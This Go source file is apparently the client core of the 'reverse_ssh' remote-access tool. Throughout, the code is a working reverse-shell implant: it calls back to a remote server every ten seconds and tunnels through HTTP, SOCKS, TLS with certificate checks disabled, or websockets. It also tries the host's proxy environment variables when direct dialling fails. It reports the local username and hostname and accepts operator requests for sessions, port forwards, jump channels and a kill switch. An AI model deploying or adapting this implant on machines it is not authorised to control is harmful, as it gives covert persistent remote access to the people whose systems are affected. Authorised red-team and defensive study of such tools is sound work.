package client

import (
	"bytes"
	"crypto/tls"
	"fmt"
	"io"
	"log"
	"net"
	"net/url"
	"os"
	"os/user"
	"regexp"
	"runtime"
	"strconv"
	"strings"
	"time"

	"github.com/NHAS/reverse_ssh/internal"
	"github.com/NHAS/reverse_ssh/internal/client/connection"
	"github.com/NHAS/reverse_ssh/internal/client/handlers"
	"github.com/NHAS/reverse_ssh/internal/client/keys"
	"github.com/NHAS/reverse_ssh/pkg/logger"
	"golang.org/x/crypto/ssh"
	socks "golang.org/x/net/proxy"
	"golang.org/x/net/websocket"
)

func WriteHTTPReq(lines []string, conn net.Conn) error {
	lines = append(lines, "") // Add an empty line for completing the HTTP request
	for _, line := range lines {

		n, err := conn.Write([]byte(line + "\r\n"))
		if err != nil {
			return err
		}

		if len(line+"\r\n") < n {
			return io.ErrShortWrite
		}
	}
	return nil
}

// https://cs.opensource.google/go/x/net/+/refs/tags/v0.19.0:http/httpproxy/proxy.go;l=27
// Due to this code not having the compatiblity promise of golang 1.x Im moving this in here just in case something changes rather than using the library
func GetProxyDetails(proxy string) (string, error) {
	if proxy == "" {
		return "", nil
	}

	proxyURL, err := url.Parse(proxy)
	if err != nil ||
		(proxyURL.Scheme != "http" &&
			proxyURL.Scheme != "https" &&
			proxyURL.Scheme != "socks" &&
			proxyURL.Scheme != "socks5" &&
			proxyURL.Scheme != "socks4") {
		// proxy was bogus. Try prepending "http://" to it and
		// see if that parses correctly. If not, we fall
		// through and complain about the original one.
		proxyURL, err = url.Parse("http://" + proxy)
	}

	if err != nil {
		return "", fmt.Errorf("invalid proxy address %q: %v", proxy, err)
	}

	// If there is no port set we need to add a default for the tcp connection
	// Yes most of these are not supported LACHLAN, and thats fine. Im lazy
	port := proxyURL.Port()
	if port == "" {
		switch proxyURL.Scheme {
		case "socks5", "socks", "socks4":
			proxyURL.Host += ":1080"
		case "https":
			proxyURL.Host += ":443"
		case "http":
			proxyURL.Host += ":80"
		}
	}
	return proxyURL.Scheme + "://" + proxyURL.Host, nil
}

func Connect(addr, proxy string, timeout time.Duration) (conn net.Conn, err error) {

	if len(proxy) != 0 {
		log.Println("Setting HTTP proxy address as: ", proxy)
		proxyURL, _ := url.Parse(proxy) // Already parsed

		if proxyURL.Scheme == "http" {

			proxyCon, err := net.DialTimeout("tcp", proxyURL.Host, timeout)
			if err != nil {
				return nil, err
			}

			if tcpC, ok := proxyCon.(*net.TCPConn); ok {
				tcpC.SetKeepAlivePeriod(2 * time.Hour)
			}

			req := []string{
				fmt.Sprintf("CONNECT %s HTTP/1.1", addr),
				fmt.Sprintf("Host: %s", addr),
			}

			err = WriteHTTPReq(req, proxyCon)
			if err != nil {
				return nil, fmt.Errorf("unable to connect proxy %s", proxy)
			}

			var responseStatus []byte
			for {
				b := make([]byte, 1)
				_, err := proxyCon.Read(b)
				if err != nil {
					return conn, fmt.Errorf("reading from proxy failed")
				}
				responseStatus = append(responseStatus, b...)

				if len(responseStatus) > 4 && bytes.Equal(responseStatus[len(responseStatus)-4:], []byte("\r\n\r\n")) {
					break
				}
			}

			if !(bytes.Contains(bytes.ToLower(responseStatus), []byte("200"))) {
				parts := bytes.Split(responseStatus, []byte("\r\n"))
				if len(parts) > 1 {
					return nil, fmt.Errorf("failed to proxy: %q", parts[0])
				}
			}

			log.Println("Proxy accepted CONNECT request, connection set up!")

			return proxyCon, nil
		}
		if proxyURL.Scheme == "socks" || proxyURL.Scheme == "socks5" {
			dial, err := socks.SOCKS5("tcp", proxyURL.Host, nil, nil)
			if err != nil {
				return nil, fmt.Errorf("reading from socks failed: %s", err)
			}
			proxyCon, err := dial.Dial("tcp", addr)
			if err != nil {

				return nil, fmt.Errorf("failed to dial socks: %s", err)
			}

			log.Println("SOCKS Proxy accepted dial, connection set up!")

			return proxyCon, nil
		}
	}

	conn, err = net.DialTimeout("tcp", addr, timeout)
	if err != nil {
		return nil, fmt.Errorf("failed to connect: %s", err)
	}

	if tcpC, ok := conn.(*net.TCPConn); ok {
		tcpC.SetKeepAlivePeriod(2 * time.Hour)
	}

	return
}

func Run(addr, fingerprint, proxyAddr, sni string) {

	sshPriv, sysinfoError := keys.GetPrivateKey()
	if sysinfoError != nil {
		log.Fatal("Getting private key failed: ", sysinfoError)
	}

	l := logger.NewLog("client")

	var err error
	proxyAddr, err = GetProxyDetails(proxyAddr)
	if err != nil {
		log.Fatal("Invalid proxy details", proxyAddr, ":", err)
	}

	var username string
	userInfo, sysinfoError := user.Current()
	if sysinfoError != nil {
		l.Warning("Couldnt get username: %s", sysinfoError.Error())
		username = "Unknown"
	} else {
		username = userInfo.Username
	}

	hostname, sysinfoError := os.Hostname()
	if sysinfoError != nil {
		hostname = "Unknown Hostname"
		l.Warning("Couldnt get host name: %s", sysinfoError)
	}

	config := &ssh.ClientConfig{
		User: fmt.Sprintf("%s.%s", username, hostname),
		Auth: []ssh.AuthMethod{
			ssh.PublicKeys(sshPriv),
		},
		HostKeyCallback: func(hostname string, remote net.Addr, key ssh.PublicKey) error {
			if fingerprint == "" { // If a server key isnt supplied, fail open. Potentially should change this for more paranoid people
				l.Warning("No server key specified, allowing connection to %s", addr)
				return nil
			}

			if internal.FingerprintSHA256Hex(key) != fingerprint {
				return fmt.Errorf("server public key invalid, expected: %s, got: %s", fingerprint, internal.FingerprintSHA256Hex(key))
			}

			return nil
		},
		ClientVersion: "SSH-" + internal.Version + "-" + runtime.GOOS + "_" + runtime.GOARCH,
	}

	realAddr, scheme := determineConnectionType(addr)

	triedHttpproxy := false
	triedHttpsproxy := false
	for {

		var conn net.Conn
		if scheme != "stdio" {
			log.Println("Connecting to ", addr)
			// First create raw TCP connection
			conn, err = Connect(realAddr, proxyAddr, config.Timeout)
			if err != nil {

				if errMsg := err.Error(); strings.Contains(errMsg, "missing port in address") {
					log.Fatalf("Unable to connect to TCP invalid address: '%s', %s", addr, errMsg)
				}

				log.Printf("Unable to connect TCP: %s\n", err)

				if os.Getenv("http_proxy") != "" && !triedHttpproxy {
					triedHttpproxy = true
					log.Println("Trying to proxy via http_proxy (", os.Getenv("http_proxy"), ")")

					proxyAddr, err = GetProxyDetails(os.Getenv("http_proxy"))
					if err != nil {
						log.Println("Could not parse the http_proxy value: ", os.Getenv("http_proxy"))
						continue
					}

					continue
				}

				if os.Getenv("https_proxy") != "" && !triedHttpsproxy {
					triedHttpsproxy = true
					log.Println("Trying to proxy via https_proxy (", os.Getenv("https_proxy"), ")")

					proxyAddr, err = GetProxyDetails(os.Getenv("https_proxy"))
					if err != nil {
						log.Println("Could not parse the https_proxy value: ", os.Getenv("https_proxy"))
						continue
					}

					continue
				}

				<-time.After(10 * time.Second)
				continue
			}

			// Add on transports as we go
			if scheme == "tls" || scheme == "wss" || scheme == "https" {

				sniServerName := sni
				if len(sni) == 0 {
					sniServerName = realAddr
					parts := strings.Split(realAddr, ":")
					if len(parts) == 2 {
						sniServerName = parts[0]
					}
				}

				clientTlsConn := tls.Client(conn, &tls.Config{
					InsecureSkipVerify: true,
					ServerName:         sniServerName,
				})
				err = clientTlsConn.Handshake()
				if err != nil {
					log.Printf("Unable to connect TLS: %s\n", err)
					<-time.After(10 * time.Second)
					continue
				}

				conn = clientTlsConn
			}

			switch scheme {
			case "wss", "ws":
				c, err := websocket.NewConfig("ws://"+realAddr+"/ws", "ws://"+realAddr)
				if err != nil {
					log.Println("Could not create websockets configuration: ", err)
					<-time.After(10 * time.Second)

					continue
				}

				wsConn, err := websocket.NewClient(c, conn)
				if err != nil {
					log.Printf("Unable to connect WS: %s\n", err)
					<-time.After(10 * time.Second)
					continue

				}
				// Pain and suffering https://github.com/golang/go/issues/7350
				wsConn.PayloadType = websocket.BinaryFrame

				conn = wsConn
			case "http", "https":

				conn, err = NewHTTPConn(scheme+"://"+realAddr, func() (net.Conn, error) {
					return Connect(realAddr, proxyAddr, config.Timeout)
				})

				if err != nil {
					log.Printf("Unable to connect HTTP: %s\n", err)
					<-time.After(10 * time.Second)
					continue
				}

			}

		} else {
			conn = &InetdConn{}
		}

		// Make initial timeout quite long so folks who type their ssh public key can actually do it
		// After this the timeout gets updated by the server
		realConn := &internal.TimeoutConn{Conn: conn, Timeout: 4 * time.Minute}

		sshConn, chans, reqs, err := ssh.NewClientConn(realConn, addr, config)
		if err != nil {
			realConn.Close()

			log.Printf("Unable to start a new client connection: %s\n", err)

			if scheme == "stdio" {
				// If we are in stdin/stdout mode (https://github.com/NHAS/reverse_ssh/issues/149), and something happens to our socket, just die. As we cant recover the connection (its for the harness to do)
				return
			}

			<-time.After(10 * time.Second)
			continue
		}

		log.Println("Successfully connnected", addr)

		go func() {

			for req := range reqs {

				switch req.Type {

				case "kill":
					log.Println("Got kill command, goodbye")
					<-time.After(5 * time.Second)
					os.Exit(0)

				case "keepalive-rssh@golang.org":
					req.Reply(false, nil)
					timeout, err := strconv.Atoi(string(req.Payload))
					if err != nil {
						continue
					}

					realConn.Timeout = time.Duration(timeout*2) * time.Second

				case "log-to-file":
					req.Reply(true, nil)

					if err := handlers.Console.ToFile(string(req.Payload)); err != nil {
						log.Println("Failed to direct log to file ", string(req.Payload), err)
					}

				case "tcpip-forward":
					go handlers.StartRemoteForward(nil, req, sshConn)

				case "query-tcpip-forwards":

					f := struct {
						RemoteForwards []string
					}{
						RemoteForwards: handlers.GetServerRemoteForwards(),
					}

					// Use ssh.Marshal instead of json.Marshal so that garble doesnt cook things
					req.Reply(true, ssh.Marshal(f))

				case "cancel-tcpip-forward":
					var rf internal.RemoteForwardRequest

					err := ssh.Unmarshal(req.Payload, &rf)
					if err != nil {
						req.Reply(false, []byte(fmt.Sprintf("Unable to unmarshal remote forward request in order to stop it: %s", err.Error())))
						return
					}

					go func(r *ssh.Request) {

						err := handlers.StopRemoteForward(rf)
						if err != nil {
							r.Reply(false, []byte(err.Error()))
							return
						}

						r.Reply(true, nil)
					}(req)

				default:
					if req.WantReply {
						req.Reply(false, nil)
					}
				}

			}
		}()

		clientLog := logger.NewLog("client")

		//Do not register new client callbacks here, they are actually within the JumpHandler
		//session is handled here as a legacy hangerover from allowing a client who has directly connected to the servers console to run the connect command
		//Otherwise anything else should be done via jumphost syntax -J
		err = connection.RegisterChannelCallbacks(chans, clientLog, map[string]func(newChannel ssh.NewChannel, log logger.Logger){
			"session":        handlers.Session(connection.NewSession(sshConn)),
			"jump":           handlers.JumpHandler(sshPriv, sshConn),
			"log-to-console": handlers.LogToConsole,
		})

		sshConn.Close()

		if err != nil {
			log.Printf("Server disconnected unexpectedly: %s\n", err)

			if scheme == "stdio" {
				return
			}

			<-time.After(10 * time.Second)
			continue
		}

	}

}

var matchSchemeDefinition = regexp.MustCompile(`.*\:\/\/`)

func determineConnectionType(addr string) (resultingAddr, transport string) {

	if !matchSchemeDefinition.MatchString(addr) {
		return addr, "ssh"
	}

	u, err := url.ParseRequestURI(addr)
	if err != nil {
		// If the connection string is in the form of 1.1.1.1:4343
		return addr, "ssh"
	}

	if u.Scheme == "" {
		// If the connection string is just an ip address (no port)
		log.Println("no port specified: ", u.Path, "using port 22")
		return u.Path + ":22", "ssh"
	}

	if u.Port() == "" {
		// Set default port if none specified
		switch u.Scheme {
		case "tls", "wss":
			return u.Host + ":443", u.Scheme
		case "ws":
			return u.Host + ":80", u.Scheme
		case "stdio":
			return "stdio://nothing", u.Scheme
		}

		log.Println("url scheme ", u.Scheme, "not recognised falling back to ssh: ", u.Host+":22", "as no port specified")
		return u.Host + ":22", "ssh"
	}

	return u.Host, u.Scheme

}
